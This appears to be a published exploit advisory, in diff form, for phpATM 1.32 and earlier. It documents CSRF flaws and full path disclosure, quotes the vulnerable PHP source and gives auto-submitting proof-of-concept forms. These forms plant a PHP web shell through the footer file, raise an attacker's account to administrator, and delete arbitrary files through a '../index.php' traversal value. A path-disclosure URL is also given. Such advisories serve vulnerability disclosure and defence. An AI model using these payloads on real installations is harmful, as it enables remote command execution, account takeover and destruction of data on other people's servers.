@@ -1,0 +1,175 @@
+<!--
+
+Exploit Title : "phpATM <= 1.32 Multiple CSRF Vulnerabilities & Full Path Disclosure Vulnerability"
+Date          :  17/06/2016
+Author        :  Paolo Massenio - pmassenio[AT]gmail
+Vendor        :  phpATM - http://phpatm.org/
+Version       :  <= 1.32
+Tested on     :  Windows 10 with XAMPP
+
+
+[1] __CSRF in configure.php__
+
+    phpATM lets the administrator to modify the footer or the header through a specific form located in configure.php.
+	The configure.php page and all of the forms in it are affected by a CSRF bug, so we will focus on the form that 
+	lets you to modify the footer.
+	
+	This section of code is called when this form is submitted:
+	
+	---configure.php---
+	149 case ACTION_SAVEFILE;
+	
+			$filename = getPostVar('filename');
+			$filebody = getPostVar('filebody');
+
+			if (!isset($filebody))
+			{ break; }
+			$filebody = stripslashes($filebody);
+			$filebody = str_replace("&", "&", $filebody);
+			$filebody = preg_replace('/[^\x09\x0A\x0D\x20-\x7F]/e', '"&#".ord($0).";"', $filebody);
+			$fp=@fopen("$cfg_folder_name/$filename","w+");
+			fwrite($fp, $filebody);
+			fclose($fp);
+			show_default(sprintf($mess[167], $filename));
+	163		break;
+	-------------------
+	
+	All the content is saved in the file (e.g. $filename="footer.html").
+	
+	For example, the footer is included in every page by the show_footer_page() function, like in the index.php page:
+	
+	---index.php---
+	[...]
+	1860 show_footer_page();
+	[...]
+	------------------
+	
+	Let see this function:
+	
+	---functions.php---
+	[...]
+	951 function show_footer_page()
+		{
+			global $footerpage, $include_location, $cfg_folder_name; //$footerpage="footer.html"
+
+			// The copyright info. Please read GPL license if you are planning to remove it.
+			echo "\n<div id=\"phpatm\"><br><a href=\"http://phpatm.org/\" target=\"_blank\" title=\"Powered by PHP Advanced Transfer Manager v".PROGRAM_VERSION."\">Powered by phpATM</a><br></div>\n";
+				
+			// Include the footer page if configured	
+			$footer_path = $include_location.$cfg_folder_name.'/'.$footerpage;
+			if (file_exists($footer_path))
+			{ include($footer_path); }
+			
+			echo "</div></td>\n</tr>\n</table>\n</body>\n</html>";
+	964	}
+	[...]
+	-------------------
+	
+	So the footer.html is included! We can write whatever we want. 
+	We can basically inject,through the CSRF, some malicius html code (e.g. persistent XSS)
+	or a malicious PHP code!
+	
+	Below a very simple example that injects malicious PHP code:	
+	
+	<body onload="document.editfile.submit()">
+	<form name="editfile" action="http://127.0.0.1/phpATM/configure.php?" method="post">
+			  <input type="hidden" name="action" value="savefile">
+			  <input type="hidden" name="filename" value="footer.htm">
+			  <input type="hidden" name="filebody" value='<?php system($_GET["cmd"]); ?>'>
+
+	</form>
+	</body>
+	
+	
+[2] __CSRF in usrmanag.php (1) change user permission__
+	
+	phpATM lets the administrator to change permission of a generic registered user through a form located in usrmanag.php page.
+	This page and all of the forms in it are affected by a CSRF bug.
+	
+	The code below lets to the evil user to modify the permissions:
+	
+	<body onload="document.useraccount.submit()">
+         <form name="useraccount" action="http://127.0.0.1/phpATM/usrmanag.php?" method="post" >
+           <input type="hidden" name="action" value="profile">
+           <input type="hidden" name="order" value="name">
+           <input type="hidden" name="letter" value="">
+           <input type="hidden" name="accpage" value="">
+           <input type="hidden" name="username" value="test">
+           <input type="hidden" name="typed_email" value="test@mailinator.com">
+		   <input type="hidden" name="typed_status" value="0">     
+         </form>
+	</body>
+	
+	username is the name of the evil user
+	typed_email is the email of the evil user
+	typed_status setted to 0 for administrator permissions.
+	
+[3] __CSRF in usrmanag.php (2) - delete any file___
+
+	phpATM doesn't use any kind of DBMS. The data of the users are collected in some files located in the 'users' folder.
+	Basically all the informations about a specified user (like username, md5 password, email, etc.) are stored in a file named 
+	like the user. 
+	
+	In usrmanag.php the admin can delete an user account. So the system will basically delete the respective file.
+	When the form is submitted, is called the change_account_data() function:
+	
+	----usrmanag.php----
+	[...]
+	function change_account_data()
+	{
+		[...]
+		if (isset($deleteaccountcheckbox))
+		{
+			if ($deleteaccountcheckbox == "on")
+			{
+				unlink("$users_folder_name/$username");                // Delete account file
+				if (file_exists("$userstat_folder_name/$username.stat"))
+				{ unlink("$userstat_folder_name/$username.stat"); }      // Delete account statistics file
+				return;
+			}
+		}
+		[...]
+	}
+	-------------------
+	
+	There is no sanification of the $username variable, in fact:
+	
+	----usrmanag.php----
+	[...]
+	$username = getPostVar('username');
+	[...]
+	--------------------
+	
+	----functions.php-----
+	[...]
+	function getPostVar($var_name)
+	{
+		if (isset($_POST[$var_name]))
+		{ return $_POST[$var_name]; }
+		else
+		{ return $HTTP_POST_VARS[$var_name]; }
+	}
+	[...]
+	--------------------
+	
+	The form is affected by a CSRF bug, the $username variable isn't saificated, so we can delete
+	any file by sending a malicious form to the logged Admin!
+	
+	Here an example:
+
+	
+	<body onload="document.useraccount.submit()">
+		<form name="useraccount" action="http://127.0.0.1/phpATM/usrmanag.php?" method="post" style="margin: 0">
+			<input type="hidden" name="action" value="profile">        
+			<input type="hidden" name="username" value="../index.php">
+			<input type="hidden" name="deleteaccountcheckbox" value="on">
+		</form>
+	</body>
+
+
+[4] __FPD__
+
+   Simply request the page: http://server/phpATM/index.php?action=view&filename[]=
+
+
+->
